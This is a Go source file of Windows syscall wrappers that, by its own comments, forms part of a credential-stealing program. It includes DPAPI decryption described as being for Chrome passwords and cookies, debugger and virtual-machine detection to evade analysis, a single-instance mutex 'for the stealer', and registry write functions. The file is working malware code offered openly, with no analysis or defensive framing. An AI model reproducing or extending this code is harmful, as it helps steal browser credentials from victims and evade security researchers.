package syscalls

/*
	Windows syscall wrappers

	Most of these are from kernel32/crypt32/user32/ntdll
	Wrapped because Go's syscall package is a pain to use directly

	Some important ones:
	- CryptUnprotectData: decrypt Chrome passwords/cookies
	- EnumProcesses: list running processes for VM detection
	- IsDebuggerPresent: basic debugger check

	Reference: https://docs.microsoft.com/en-us/windows/win32/api/
*/

import (
	"syscall"
	"unsafe"
)

// ============================================
// DLL and proc definitions
// lazy loading so we don't crash if DLL is missing
// ============================================

var (
	kernel32 = syscall.NewLazyDLL("kernel32.dll")
	crypt32  = syscall.NewLazyDLL("crypt32.dll")
	user32   = syscall.NewLazyDLL("user32.dll")
	advapi32 = syscall.NewLazyDLL("advapi32.dll")
	ntdll    = syscall.NewLazyDLL("ntdll.dll")

	// kernel32.dll
	procCreateMutex          = kernel32.NewProc("CreateMutexW")
	procGetLastError         = kernel32.NewProc("GetLastError")
	procVirtualProtect       = kernel32.NewProc("VirtualProtect")
	procIsDebuggerPresent    = kernel32.NewProc("IsDebuggerPresent")
	procCheckRemoteDebugger  = kernel32.NewProc("CheckRemoteDebuggerPresent")
	procGetTickCount64       = kernel32.NewProc("GetTickCount64")
	procGlobalMemoryStatusEx = kernel32.NewProc("GlobalMemoryStatusEx")
	procGetSystemInfo        = kernel32.NewProc("GetSystemInfo")
	procCreateToolhelp32     = kernel32.NewProc("CreateToolhelp32Snapshot")
	procProcess32First       = kernel32.NewProc("Process32FirstW")
	procProcess32Next        = kernel32.NewProc("Process32NextW")
	procOpenProcess          = kernel32.NewProc("OpenProcess")
	procCloseHandle          = kernel32.NewProc("CloseHandle")

	// crypt32.dll - the important one for password decryption
	procCryptUnprotectData = crypt32.NewProc("CryptUnprotectData")

	// user32.dll - for screenshots
	procGetDC            = user32.NewProc("GetDC")
	procReleaseDC        = user32.NewProc("ReleaseDC")
	procGetSystemMetrics = user32.NewProc("GetSystemMetrics")

	// advapi32.dll - registry stuff
	procRegOpenKeyEx    = advapi32.NewProc("RegOpenKeyExW")
	procRegQueryValueEx = advapi32.NewProc("RegQueryValueExW")
	procRegSetValueEx   = advapi32.NewProc("RegSetValueExW")
	procRegCloseKey     = advapi32.NewProc("RegCloseKey")

	// ntdll.dll - for anti-debug
	procNtQueryInformationProcess = ntdll.NewProc("NtQueryInformationProcess")
)

// ============================================
// Structures matching Windows API
// ============================================

// DataBlob - used for DPAPI functions
type DataBlob struct {
	CbData uint32
	PbData *byte
}

// MemoryStatusEx - system memory info
type MemoryStatusEx struct {
	Length               uint32
	MemoryLoad           uint32
	TotalPhys            uint64
	AvailPhys            uint64
	TotalPageFile        uint64
	AvailPageFile        uint64
	TotalVirtual         uint64
	AvailVirtual         uint64
	AvailExtendedVirtual uint64
}

// SystemInfo - processor and system info
type SystemInfo struct {
	ProcessorArchitecture     uint16
	Reserved                  uint16
	PageSize                  uint32
	MinimumApplicationAddress uintptr
	MaximumApplicationAddress uintptr
	ActiveProcessorMask       uintptr
	NumberOfProcessors        uint32
	ProcessorType             uint32
	AllocationGranularity     uint32
	ProcessorLevel            uint16
	ProcessorRevision         uint16
}

// ProcessEntry32 - info about a running process
type ProcessEntry32 struct {
	Size            uint32
	CntUsage        uint32
	ProcessID       uint32
	DefaultHeapID   uintptr
	ModuleID        uint32
	CntThreads      uint32
	ParentProcessID uint32
	PriClassBase    int32
	Flags           uint32
	ExeFile         [260]uint16 // MAX_PATH
}

// Windows constants
const (
	ERROR_ALREADY_EXISTS = 183        // mutex already exists
	TH32CS_SNAPPROCESS   = 0x00000002 // include processes in snapshot
	PROCESS_ALL_ACCESS   = 0x1F0FFF   // all access to process
	HKEY_CURRENT_USER    = 0x80000001 // HKCU registry hive
	KEY_ALL_ACCESS       = 0xF003F    // full registry access
	REG_SZ               = 1          // string registry type
)

// ============================================
// Function wrappers
// ============================================

// CreateMutex - creates a named mutex
// used to prevent multiple instances of the stealer running
func CreateMutex(name string) (bool, error) {
	namePtr, _ := syscall.UTF16PtrFromString(name)
	ret, _, err := procCreateMutex.Call(0, 1, uintptr(unsafe.Pointer(namePtr)))
	if ret == 0 {
		return false, err
	}

	lastErr, _, _ := procGetLastError.Call()
	if lastErr == ERROR_ALREADY_EXISTS {
		return false, nil // already running
	}
	return true, nil
}

// DPAPI decrypt
func CryptUnprotectData(data []byte) ([]byte, error) {
	var outBlob DataBlob
	inBlob := DataBlob{
		CbData: uint32(len(data)),
		PbData: &data[0],
	}

	ret, _, err := procCryptUnprotectData.Call(
		uintptr(unsafe.Pointer(&inBlob)),
		0, 0, 0, 0, 0,
		uintptr(unsafe.Pointer(&outBlob)),
	)

	if ret == 0 {
		return nil, err
	}

	output := make([]byte, outBlob.CbData)
	copy(output, unsafe.Slice(outBlob.PbData, outBlob.CbData))
	return output, nil
}

// IsDebuggerPresent check
func IsDebuggerPresent() bool {
	ret, _, _ := procIsDebuggerPresent.Call()
	return ret != 0
}

// CheckRemoteDebugger
func CheckRemoteDebugger() bool {
	var isDebugger int32
	handle, _ := syscall.GetCurrentProcess()
	ret, _, _ := procCheckRemoteDebugger.Call(
		uintptr(handle),
		uintptr(unsafe.Pointer(&isDebugger)),
	)
	return ret != 0 && isDebugger != 0
}

// GetTickCount64
func GetTickCount64() uint64 {
	ret, _, _ := procGetTickCount64.Call()
	return uint64(ret)
}

// GetMemoryStatus
func GetMemoryStatus() (*MemoryStatusEx, error) {
	var mem MemoryStatusEx
	mem.Length = uint32(unsafe.Sizeof(mem))
	ret, _, err := procGlobalMemoryStatusEx.Call(uintptr(unsafe.Pointer(&mem)))
	if ret == 0 {
		return nil, err
	}
	return &mem, nil
}

// GetSystemInfo
func GetSystemInfo() *SystemInfo {
	var info SystemInfo
	procGetSystemInfo.Call(uintptr(unsafe.Pointer(&info)))
	return &info
}

// EnumProcesses - returns list of running processes
func EnumProcesses() ([]string, error) {
	var processes []string

	snapshot, _, err := procCreateToolhelp32.Call(TH32CS_SNAPPROCESS, 0)
	if snapshot == 0 {
		return nil, err
	}
	defer procCloseHandle.Call(snapshot)

	var pe ProcessEntry32
	pe.Size = uint32(unsafe.Sizeof(pe))

	ret, _, _ := procProcess32First.Call(snapshot, uintptr(unsafe.Pointer(&pe)))
	if ret == 0 {
		return nil, nil
	}

	for {
		name := syscall.UTF16ToString(pe.ExeFile[:])
		processes = append(processes, name)

		ret, _, _ = procProcess32Next.Call(snapshot, uintptr(unsafe.Pointer(&pe)))
		if ret == 0 {
			break
		}
	}

	return processes, nil
}

// registry operations
func RegOpenKey(key uintptr, subkey string) (uintptr, error) {
	var handle uintptr
	subkeyPtr, _ := syscall.UTF16PtrFromString(subkey)
	ret, _, err := procRegOpenKeyEx.Call(
		key,
		uintptr(unsafe.Pointer(subkeyPtr)),
		0,
		KEY_ALL_ACCESS,
		uintptr(unsafe.Pointer(&handle)),
	)
	if ret != 0 {
		return 0, err
	}
	return handle, nil
}

func RegSetValue(handle uintptr, name string, value string) error {
	namePtr, _ := syscall.UTF16PtrFromString(name)
	valueBytes, _ := syscall.UTF16FromString(value)
	ret, _, err := procRegSetValueEx.Call(
		handle,
		uintptr(unsafe.Pointer(namePtr)),
		0,
		REG_SZ,
		uintptr(unsafe.Pointer(&valueBytes[0])),
		uintptr(len(valueBytes)*2),
	)
	if ret != 0 {
		return err
	}
	return nil
}

func RegCloseKey(handle uintptr) {
	procRegCloseKey.Call(handle)
}
